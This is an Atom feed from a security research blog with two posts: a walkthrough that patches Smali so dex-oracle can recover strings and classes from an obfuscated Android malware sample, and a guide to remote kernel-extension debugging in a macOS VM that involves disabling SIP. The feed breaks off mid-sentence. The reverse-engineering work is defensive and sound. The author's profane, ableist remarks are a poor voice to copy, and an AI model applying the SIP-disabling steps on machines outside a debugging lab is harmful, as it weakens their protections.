<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RedNaga Security</title>
  <subtitle>spicy security research</subtitle>
  <link href="/rss2.xml" rel="self"/>
  
  <link href="https://rednaga.io/"/>
  <updated>2017-10-29T00:30:34.000Z</updated>
  <id>https://rednaga.io/</id>
  
  <author>
    <name>RedNaga</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hacking with dex-oracle for Android Malware Deobfuscation</title>
    <link href="https://rednaga.io/2017/10/28/hacking-with-dex-oracle-for-android-malware-deobfuscation/"/>
    <id>https://rednaga.io/2017/10/28/hacking-with-dex-oracle-for-android-malware-deobfuscation/</id>
    <published>2017-10-28T07:00:00.000Z</published>
    <updated>2017-10-29T00:30:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>About a month or two ago, someone asked me to analyze some obfuscated Android malware. Recently, I finally had a chance to take a look. I ended up using <a href="https://github.com/CalebFenton/dex-oracle" target="_blank" rel="external">dex-oracle</a> along with some tricks to partially deobfuscate it. In this post, I’m going to explain the tricks and the overall process I used. This post will be useful if you deal with a lot of obfuscated Android apps.</p>
<p>The main problem was dex-oracle didn’t work “out of the box”. It took some “hacking” to make it work. Specifically, I modified an existing deobfuscation plugin to create two new plugins as well as slightly modify the app. It’s really hard to make completely generalized deobfuscation tools, or any kind of advanced tool, so you’ll need to know how it works in order to modify it to suit your needs.<br><a id="more"></a></p>
<h2 id="The-Sample"><a href="#The-Sample" class="headerlink" title="The Sample"></a>The Sample</h2><p>Here’s the SHA256:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ shasum <span class="_">-a</span> 256 xjmurla.gqscntaej.bfdiays.apk</div><div class="line">d3becbee846560d0ffa4f3cda708d69a98dff92785b7412d763f810c51c0b091  xjmurla.gqscntaej.bfdiays.apk</div></pre></td></tr></table></figure>
<h2 id="High-Level-Analysis"><a href="#High-Level-Analysis" class="headerlink" title="High-Level Analysis"></a>High-Level Analysis</h2><p>I like to start with a decompilation just to get a high level overview of the package structure. Here’s what the class list:</p>
<p><img src="/images/hacking-with-dex-oracle-for-android-malware-deobfuscation/class_list.png" alt="class list"></p>
<p>Some class names have been ProGuard’ed (<code>a</code>, <code>b</code>, <code>c</code>, etc.) but some haven’t (<code>Ceacbcbf</code>). These unobfuscated classes are probably Android components (activity, service, broadcast receiver, etc.) which must be declared in the manifest. Thus, any tool which automatically renames them would also have to rename them in the manifest, which is hard. These may have been manually changed. The obfuscation is probably home-made and partially done by hand. This means it’s probably malicious because a legit developer would probably pull a commercial obfuscator off the shelf and just use that. They wouldn’t waste time changing their class names to something indecipherable like <code>Aeabffdccdac</code>.</p>
<p>The code is obfuscated. Below is a class which shows the obfuscation:</p>
<p><img src="/images/hacking-with-dex-oracle-for-android-malware-deobfuscation/obfuscated_method.png" alt="obfuscated method decompilation"></p>
<p>You can’t see any strings or class names, which is really annoying. This looks like something <a href="https://github.com/CalebFenton/simplify" target="_blank" rel="external">Simplify</a> can handle, but, <em>spoilers</em>, it fails miserably. That’s fine. I have many tricks up my sleeve. Let’s take a look at the Smali and see if anything jumps out.</p>
<h2 id="String-and-Class-Obfuscation"><a href="#String-and-Class-Obfuscation" class="headerlink" title="String and Class Obfuscation"></a>String and Class Obfuscation</h2><p>The first type of obfuscation which jumped out at me was an “indexed string lookup” type obfuscation.</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">const v2, 0x320fb26f<span class="built_in"></span></div><div class="line">invoke-static &#123;v2&#125;, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;a(I)<span class="class">Ljava/lang/String;</span><span class="built_in"></span></div><div class="line">move-result-object v2</div></pre></td></tr></table></figure>
<p>This pattern is found hundreds of times in the code. It takes a number, passes it to <code>f.a(int)</code>, and gets a string back. This is some basic “level 1” style encryption. There’s probably a big method somewhere which builds an array of strings that the number indexes into.</p>
<p>A second type of obfuscation hides class constants using an identical technique:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">const v1, 0x19189b07<span class="built_in"></span></div><div class="line">invoke-static &#123;v1&#125;, <span class="class">Lxjmurla/gqscntaej/bfdiays/g;</span>-&gt;c(I)<span class="class">Ljava/lang/Class;</span><span class="built_in"></span></div><div class="line">move-result-object v1</div></pre></td></tr></table></figure>
<p>This code passes a number to <code>g.c(int)</code> and gets back a class object (<code>const-class</code>).</p>
<p>You may be thinking you’ll have to reverse engineer the lookup methods, and you’d be wrong. It’s cool and all to deep dive into the complex code and completely master it by writing a decryption routine. But honestly, fuck that. Speed is the name of the game, and I really don’t have time to fuck around with this malware author’s bullshit, retarded, home-made, amateur hour obfuscation. Instead of reversing everything, consider that these “lookup” methods are both <em>static</em>. It should be possible to just execute them with the same inputs from the code to get back the decrypted output. For example, in the case of string decryption, I should be able to execute <code>f.a(0x320fb26f)</code> and get back the decrypted string.</p>
<p>The question is, of course, how do you execute just the target method code? It’s an APK. How can you execute just the method you want with the inputs you want? How do you <em>harness</em> the target methods? There are two paths you can go by:</p>
<ol>
<li>Convert target DEX to a JAR using <a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">dex2jar</a> or <a href="https://github.com/google/enjarify" target="_blank" rel="external">enjarify</a>. Then, import the JAR into a Java app and call the decryption code from your Java app.</li>
<li>Create a stub / driver app which takes command line arguments and can reflect methods in a DEX file. Then, execute the driver app + target DEX on an emulator.</li>
</ol>
<p>As it happens, I’ve already created <a href="https://github.com/CalebFenton/dex-oracle" target="_blank" rel="external">dex-oracle</a> which does #2. I like #2 more than #1 because it doesn’t rely on decompilers which often introduce subtle logic bugs. However, I’ve used #1 a few times in a pinch, so it’s worth mentioning. I went about adding support for this type of obfuscation to dex-oracle. the plugins were added in <a href="https://github.com/CalebFenton/dex-oracle/commit/cf44cd7aa5e81d5b0bc9588150b81a0fcdc575fe" target="_blank" rel="external">Add indexed string + class lookups</a>.</p>
<p>The way dex-oracle works is pretty simple. It contains a collection of plugins which define regular expressions which pull out key bits of information – method calls and arguments. Then, it constructs real method calls with the arguments you pull out and passes them to a driver which executes the original DEX file on an emulator. Finally, the plugin defines how the driver output should be used to modify the method.</p>
<p>For example, the regular expression could look for “a const number, a call to a static method which takes a number and returns a string, and moves the result to a register”. Then, the driver executes that method with the number and returns the decrypt string. Finally, the original string lookup code is replaced with just the decrypted string. You can read more about how it works in <a href="https://www.slideshare.net/tekproxy/tetcon-2016" target="_blank" rel="external">TetCon 2016 Android Deobfuscation Presentation</a>.</p>
<h2 id="dex-oracle-Before-Modification"><a href="#dex-oracle-Before-Modification" class="headerlink" title="dex-oracle Before Modification"></a>dex-oracle Before Modification</h2><p>Unfortunately, even with the new plugins, dex-oracle fails. To keep things simple, I disable all plugins except IndexStringLookup and I only process the <code>d</code> class from the picture example above.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$ dex-oracle xjmurla.gqscntaej.bfdiays.apk --disable-plugins bitwiseantiskid,stringdecryptor,undexguard,unreflector,indexedclasslookup -i <span class="string">'/d'</span></div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Optimizing 11 methods over 23 Smali files.</div><div class="line">[WARN] 2017-10-28 12:28:45: Unsuccessful status: failure <span class="keyword">for</span> Error executing <span class="string">'static java.lang.String xjmurla.gqscntaej.bfdiays.f.a(int)'</span> with <span class="string">'I:839889519'</span></div><div class="line">java.lang.reflect.InvocationTargetException</div><div class="line">    at java.lang.reflect.Method.invokeNative(Native Method)</div><div class="line">    at java.lang.reflect.Method.invoke(Method.java:515)</div><div class="line">    at org.cf.oracle.Driver.invokeMethod(Driver.java:71)</div><div class="line">    at org.cf.oracle.Driver.main(Driver.java:131)</div><div class="line">    at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)</div><div class="line">    at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:243)</div><div class="line">    at dalvik.system.NativeStart.main(Native Method)</div><div class="line">Caused by: java.lang.NullPointerException</div><div class="line">    at xjmurla.gqscntaej.bfdiays.f.a(SourceFile:528)</div><div class="line">    ... 7 more</div><div class="line"></div><div class="line">// ** SNIP MANY SIMILAR ERRORS **</div><div class="line"></div><div class="line">Optimizations: string_lookups=13</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">// ** SNIP DUMB WARNINGS **</div><div class="line">Invalid date/time <span class="keyword">in</span> zip entry</div><div class="line">Time elapsed 1.954255 seconds</div></pre></td></tr></table></figure>
<p>The <code>Invalid date/time in zip entry</code> stuff is just noise. Maybe they tried obfuscating the timestamp in the ZIP? I dunno.</p>
<p>What concerns me is the <code>Unsuccessful status: failure for Error executing &#39;static java.lang.String xjmurla.gqscntaej.bfdiays.f.a(int)&#39; with &#39;I:839889519&#39;</code>. The error tells me there’s a <code>NullPointerException</code> when it executes <code>f.a(int)</code>. Looks like every time it tried to call that method, it failed. So, let’s look at <code>f.a(int)</code>.</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.method</span><span class="keyword"> static</span> a(I)<span class="class">Ljava/lang/String;</span></div><div class="line"><span class="keyword">    .registers</span> 3</div><div class="line"></div><div class="line">   <span class="built_in"> sget-object </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;k:[<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">   <span class="built_in"> const </span>v1, 0x320fb1f0</div><div class="line">   <span class="built_in"> sub-int </span>v1, p0, v1</div><div class="line">   <span class="built_in"> aget-object </span>v0, v0, v1</div><div class="line"></div><div class="line">   <span class="built_in"> return-object </span>v0<span class="keyword"></span></div><div class="line">.end method</div></pre></td></tr></table></figure>
<p>The entire method is pretty small. Just subtracts the first argument from a big constant and uses that as an index into a string array, <code>Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;</code>. Well, let’s look out <code>f;-&gt;k</code> is initialized.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ag -Q <span class="string">'Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;'</span></div><div class="line">xjmurla/gqscntaej/bfdiays/Ceacabcbf.smali</div><div class="line">169:    sput-object v0, Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;</div><div class="line">245:    sget-object v0, Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;</div><div class="line">256:    sget-object v0, Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;</div><div class="line"></div><div class="line">xjmurla/gqscntaej/bfdiays/f.smali</div><div class="line">72:    sget-object v0, Lxjmurla/gqscntaej/bfdiays/f;-&gt;k:[Ljava/lang/String;</div></pre></td></tr></table></figure>
<p>There’s only one <code>sput-object</code> and it’s in <code>xjmurla/gqscntaej/bfdiays/Ceacabcbf.smali</code>. By looking for this line in <code>Ceacabcbf</code>, we find <code>private Ceacabcbf;-&gt;a()V</code>. This is a big, long, complicated method which contains a HUGE string literal which is processed, chunked up, and stored in <code>f;-&gt;k</code>. Hmm, our <code>NullPointerException</code> is caused by this field not getting initialized. This means that <code>Ceacabcbf;-&gt;a()V</code> is not getting called during execution of the string decryption method. Well, when <em>is</em> it called?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ag -Q <span class="string">'Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;-&gt;a()V'</span></div><div class="line">xjmurla/gqscntaej/bfdiays/Ceacabcbf.smali</div><div class="line">1313:    invoke-direct &#123;p0&#125;, Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;-&gt;a()V</div></pre></td></tr></table></figure>
<p>Ahh, it’s only called in <code>Ceacabcbf</code>. Let’s find that.</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onCreate()V</div><div class="line"><span class="keyword">    .registers</span> 1</div><div class="line"></div><div class="line">   <span class="built_in"> invoke-super </span>&#123;p0&#125;, <span class="class">Landroid/app/Application;</span>-&gt;onCreate()V</div><div class="line"></div><div class="line">   <span class="built_in"> sput-object </span>p0, <span class="class">Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;</span>-&gt;a:<span class="class">Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;</span></div><div class="line"></div><div class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;</span>-&gt;a()V</div><div class="line"></div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div></pre></td></tr></table></figure>
<p>It’s called in <code>Ceacabcbf;-&gt;onCreate()V</code>. This class is a subclass of <code>Application</code>. Without looking at the manifest, I’m pretty sure that when the app starts, this component is created, <code>onCreate()V</code> is called, the decrypted string array is built, and most importantly <code>f;-&gt;k</code> is initialized. Hmm, how can I make it so that dex-oracle calls this method when decrypting strings?</p>
<p>My first thought is to add a method call to <code>Ceacabcbf;-&gt;a()V</code> in <code>f;-&gt;&lt;clinit&gt;</code>. This ensures that when the string decryption class <code>f</code> is loaded, it initializes the decrypted string array. BUT, <code>a()V</code> is direct. WHAT TO DO?</p>
<p>Well, this is kind of dumb but it works sometimes. Just create a new public, static method called <code>Ceacabcbf;-&gt;init_decrypt()V</code> and copy the code from <code>Ceacabcbf;-&gt;a()V</code>. Then, add a line to call this method in <code>f;-&gt;&lt;clinit&gt;</code>:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.method</span><span class="keyword"> static</span><span class="keyword"> constructor</span> &lt;clinit&gt;()V</div><div class="line"><span class="keyword">    .registers</span> 1</div><div class="line"></div><div class="line">   <span class="built_in"> const/4 </span>v0, 0x0</div><div class="line">   <span class="built_in"> sput </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;a:I</div><div class="line">   <span class="built_in"> sput </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;d:I</div><div class="line">   <span class="built_in"> sput </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;e:I</div><div class="line">   <span class="built_in"> sput </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;f:I</div><div class="line"></div><div class="line">   <span class="built_in"> const/4 </span>v0, 0x4</div><div class="line">   <span class="built_in"> new-array </span>v0, v0, [<span class="class">Ljava/lang/String;</span></div><div class="line">   <span class="built_in"> sput-object </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;h:[<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">   <span class="built_in"> const-string </span>v0, <span class="string">""</span></div><div class="line">   <span class="built_in"> sput-object </span>v0, <span class="class">Lxjmurla/gqscntaej/bfdiays/f;</span>-&gt;i:<span class="class">Ljava/lang/Object;</span></div><div class="line"></div><div class="line">     <span class="comment"># LOL MONEY, MONEY LOL</span></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;&#125;, <span class="class">Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;</span>-&gt;init_decrypt()V</div><div class="line"></div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div></pre></td></tr></table></figure>
<h2 id="dex-oracle-After-Modification"><a href="#dex-oracle-After-Modification" class="headerlink" title="dex-oracle After Modification"></a>dex-oracle After Modification</h2><p>After making some changes which hopefully work, need rebuild the DEX from the modified Smali and try dex-oracle on it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ smali ass out -o xjmurla_mod1.dex</div><div class="line">$ dex-oracle xjmurla_mod1.dex --disable-plugins bitwiseantiskid,stringdecryptor,undexguard,unreflector,indexedclasslookup -i <span class="string">'/d'</span></div><div class="line">Optimizing 11 methods over 23 Smali files.</div><div class="line">Optimizations: string_lookups=13</div><div class="line">Time elapsed 2.034493 seconds</div></pre></td></tr></table></figure>
<p>No errors. Let’s see the decompilation.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ d2j-dex2jar.sh xjmurla_mod1_oracle.dex</div><div class="line">dex2jar xjmurla_mod1_oracle.dex -&gt; ./xjmurla_mod1_oracle-dex2jar.jar</div><div class="line">$ jd xjmurla_mod1_oracle-dex2jar.jar</div></pre></td></tr></table></figure>
<p><img src="/images/hacking-with-dex-oracle-for-android-malware-deobfuscation/d_partially_deobfuscated.png" alt="deobfuscated strings"></p>
<p>Oh, <em>hello there</em> Mr. C&amp;C domain! GET REKT BRO.</p>
<p><img src="/images/hacking-with-dex-oracle-for-android-malware-deobfuscation/get_rekt.gif" alt="get rekt"></p>
<p>Ok, but that still leaves the class deobfuscation. That’s still annoying, right? Well, to keep this post short, dex-oracle fails when deobbfuscating classes for the same reason as it originally failed for strings. The same <code>Ceacabcbf;-&gt;a()V</code> method needs to be called.</p>
<p>The same trick can be used – just call <code>Ceacabcbf;-&gt;init_decrypt()V</code> in <code>g;-&gt;&lt;clinit&gt;</code>. However, <code>g</code> doesn’t have a <code>&lt;clinit&gt;</code> so you’ll have to add one:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.method</span><span class="keyword"> static</span><span class="keyword"> constructor</span> &lt;clinit&gt;()V</div><div class="line"><span class="keyword">    .registers</span> 0</div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;&#125;, <span class="class">Lxjmurla/gqscntaej/bfdiays/Ceacabcbf;</span>-&gt;init_decrypt()V</div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div></pre></td></tr></table></figure>
<p>Now, rebuild and let dex-oracle do it’s thing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ smali ass out -o xjmurla_mod2.dex</div><div class="line">$ dex-oracle xjmurla_mod2.dex  -i <span class="string">'/d'</span></div><div class="line">Optimizing 11 methods over 23 Smali files.</div><div class="line">Optimizations: string_decrypts=0, class_lookups=13, string_lookups=13</div><div class="line">Time elapsed 3.099335 seconds</div></pre></td></tr></table></figure>
<p>Let’s see if the decompilation looks any different.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ d2j-dex2jar.sh xjmurla_mod2_oracle.dex</div><div class="line">dex2jar xjmurla_mod1_oracle.dex -&gt; ./xjmurla_mod2_oracle-dex2jar.jar</div><div class="line">$ jd xjmurla_mod1_oracle-dex2jar.jar</div></pre></td></tr></table></figure>
<p><img src="/images/hacking-with-dex-oracle-for-android-malware-deobfuscation/d_deobfuscated.png" alt="deobfuscated strings and classes"></p>
<p>There’s not much difference for this method, but other methods have a lot more information, especially in the Smali where you can see lots of <code>const-class</code>es. There’s still one call to <code>g.c(int)</code> which isn’t deobfuscated. I found out that this is because the method call succeeds but returns <code>null</code>. Maybe that’s why it’s in a try-catch? Maybe it’s trying to load a class which doesn’t exist on every Android API version?</p>
<p>One final test: run it against the entire DEX file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ dex-oracle xjmurla_mod2.dex</div><div class="line">Optimizing 125 methods over 23 Smali files.</div><div class="line">Optimizations: string_decrypts=0, class_lookups=354, string_lookups=330</div><div class="line">Time elapsed 3.306326 seconds</div></pre></td></tr></table></figure>
<p>It worked. Cool. Now there are lots of strings! This should also make it a lot easier for Simplify to work because there’s less code to execute and fewer places to fail.</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Hopefully after reading this you have better idea of how to bend dex-oracle to suit your needs. It’s pretty flexible and great when you can isolate the code you need to run to a single method. Sometimes you need to make changes to an Android app to help dex-oracle, but modifying Smali is relatively easy to modify and a lot of malware doesn’t bother doing anti-tampering checks.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;About a month or two ago, someone asked me to analyze some obfuscated Android malware. Recently, I finally had a chance to take a look. I ended up using &lt;a href=&quot;https://github.com/CalebFenton/dex-oracle&quot;&gt;dex-oracle&lt;/a&gt; along with some tricks to partially deobfuscate it. In this post, I’m going to explain the tricks and the overall process I used. This post will be useful if you deal with a lot of obfuscated Android apps.&lt;/p&gt;
&lt;p&gt;The main problem was dex-oracle didn’t work “out of the box”. It took some “hacking” to make it work. Specifically, I modified an existing deobfuscation plugin to create two new plugins as well as slightly modify the app. It’s really hard to make completely generalized deobfuscation tools, or any kind of advanced tool, so you’ll need to know how it works in order to modify it to suit your needs.&lt;br&gt;
    
    </summary>
    
    
      <category term="dex-oracle" scheme="https://rednaga.io/tags/dex-oracle/"/>
    
      <category term="android" scheme="https://rednaga.io/tags/android/"/>
    
      <category term="malware" scheme="https://rednaga.io/tags/malware/"/>
    
      <category term="deobfuscation" scheme="https://rednaga.io/tags/deobfuscation/"/>
    
  </entry>
  
  <entry>
    <title>Remote Kext Debugging (No, really - it worked!)</title>
    <link href="https://rednaga.io/2017/04/09/remote_kext_debugging/"/>
    <id>https://rednaga.io/2017/04/09/remote_kext_debugging/</id>
    <published>2017-04-09T07:00:00.000Z</published>
    <updated>2017-10-29T00:35:07.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/remote_kext_debugging/drinking.gif" alt=""><br>This gif perfectly describe me attempting to connect debuggers to a kext using all the “simple” instructions on the internet.</p>
<p>Recently I had far too much time on my hands and a Kext binary which seemed to pique my interest. After spending a bit of time analyzing the binary in IDA Pro, I wanted to prove out some theories I had by debugging it. A while back I had set up MacOS to be running as a QEMU/KVM machine - though I no longer had access to the hardware that I set this up on. The purpose of the previous use case was to have lots of instances up (fuzzing) as opposed to in depth debugging, and I had never actually wondered about debugging the kernel. Anyhoo - I decided to revisit setting up a virtualized instance of MacOS and decided to go the VMWare Fusion route. I had a license on the computer I had in front of me, wanted to continually do snapshots, and just assumed it would be easy to get it working locally. Well, I was sort of right?<br><a id="more"></a></p>
<p>The bulk of the VMWare fusion part was just following the <a href="https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2129534" target="_blank" rel="external">knowledgebase article from VMWare</a> - there really isn’t any magic to do there.</p>
<p>After getting the VM built and set up - all the sources I found online seem to point out you will need to disable SIP and get your host environment setup. Patrick Wardle <a href="https://objective-see.com/blog.html#blogEntry9" target="_blank" rel="external">documented this process</a> quite well over on his blog, though it didn’t “just work” for me - though I kept being stumped as to why. Honestly, I still have no idea what the issue was, though I’ve been able to implement a workaround for the time being.<br>To summarize the steps from Patrick’s page, we need to do the following;</p>
<ul>
<li>Disable SIP on the vm<br>Boot into Recovery Mode, open a terminal and type <code>csrutil disable</code>.<br>Reboot the VM</li>
<li><p>Enable Debugging in the Guest environment<br>After the VM reboots, open a terminal and change the <code>boot-args</code> by doing the following;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo nvram boot-args=&quot;debug=0x141 pmuflags=1 -v</div></pre></td></tr></table></figure>
<p>Reboot the VM</p>
</li>
</ul>
<p>This is the first step that didn’t work out quite the way I had hoped. According to most sources online, setting <code>debug=0x141</code> should cause the system to prompt you with a <code>Waiting for remote debugger connection.</code> while booting up. However, this never occured for me. After Googling more and more, I couldn’t really find anyone who had mentioned this issue (which is the main motivation for writing this) - so I pushed on until I found a better explanation of the boot args. According to the <a href="https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/build/build.html#//apple_ref/doc/uid/TP30000905-CH221-BABDGEGF" target="_blank" rel="external">Apple Developer Documentation Page</a> by setting <code>0x141</code> - these are the correct flags for us to set. Since <code>0x141 = (DB_HALT | DB_ARP | DB_LOG_PI_SCREEN)</code>, however it would appear the <code>DB_HALT</code> option is non-functional at this point in time. If anyone knows the reasoning behind the, or if this is just a weird blunder on my part, feel  free to comment here or shoot me a message. I cannot seem to find any real reasoning behind this no longer working.</p>
<p>The workaround for this, which I assume everyone doing kernel debugging is using at this point, is to use the <code>DB_NMI</code> flag, so the command we run to properly set up the <code>boot-args</code> will be;<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo nvram boot-args=&quot;debug=0x144 pmuflags=1 -v&quot;</div></pre></td></tr></table></figure></p>
<p>Then reboot the machine.<br>This allows us to have the debugger listen for <em>N</em>on-<em>M</em>asking <em>I</em>terrupts, which we can cause at any time. These can be create by pressing <code>Esc + Control + Option + Command</code> at the same time - if on a laptop where you  have turned on the “Use function keys as function keys” option, you’ll need to hold the <code>fn</code> key as well. This will overlay text on the top left of your screen indicating the IP address to connect too.</p>
<ul>
<li>On host, download and install Apple’s “Kernel Debug Kit” which is specific to the kernel<br>of the guest environment you want to debug.</li>
<li>Start <code>lldb</code> on the host machine and point it at the kernel you just downloaded<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ lldb</div><div class="line">(lldb) target create /Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel.development</div><div class="line">(lldb) command script import &quot;/Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel.dSYM/Contents/Resources/DWARF/../Python/kernel.py</div></pre></td></tr></table></figure>
</li>
</ul>
<p>Now, if you have your guest properly set up and waiting for the debugger, you could now attach <code>lldb</code> directly to the ip address.<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(lldb) kdp-remote 172.16.210.142</div></pre></td></tr></table></figure></p>
<p>Voila! Well, sort of? It did work for a short time, approximately ~60 seconds or so. The debugger appears to attach fine, breakpoints would be set and hit. Though after the first minute or so, it would seem the the remote connect somehow would continuously drop. Neither lldb or the guest environment would notice this or complain - just every command would seemingly either silently fail or error out for unknown Python reasons.</p>
<p>At this point I was getting a bit frustrated. I had to have done something wrong: The entire set up got trashed and I started again, checking every step to ensure I was doing it correctly. Though the resulting set up seemed to always have the same outcome - 60 or so seconds of debug time and then a reboot would be required to connect again. This clearly wasn’t a workable option. I blindly started tweeting some rage about how silly debugging kernel code on MacOS seemed to be, no documentation I could find correctly explained getting it working, and seemingly no one had ever run into this problem. Magically, complaining on twitter did something and a friend I met at <a href="https://www.hoodsec.org" target="_blank" rel="external">Hoodsec</a> mentioned something along the lines of <em>“lldb kdb over udp is often laggy and not stable, use gdb”</em>. Without attempting to start an <code>emacs vs vim</code> style fight, I immediately loved the idea since I prefer <code>gdb</code> over <code>lldb</code> anyway - it just seems to be a comfort zone for me. Off to Google - more about using <code>gdb</code> to debug kexts I come across <a 